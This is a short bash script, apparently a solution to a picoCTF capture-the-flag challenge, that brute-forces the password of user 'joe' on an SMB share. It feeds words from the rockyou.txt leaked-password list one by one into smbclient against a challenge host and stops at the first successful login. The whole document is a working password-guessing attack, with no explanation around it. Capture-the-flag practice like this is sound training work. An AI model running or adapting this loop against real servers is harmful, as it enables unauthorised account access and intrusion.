for w in $(sed -n '3001,$p' /usr/share/wordlists/rockyou.txt | tr -c '[:alnum:]' ' ' | tr '[:upper:]' '[:lower:]' | sort -u); do 
    echo "Testing: $w"; 
    smbclient //green-hill.picoctf.net/secure-shares -p 59530 -U joe%"$w" -c 'ls' && echo "SUCCESS! Password is: $w" && break; 
    sleep 0.3; 
done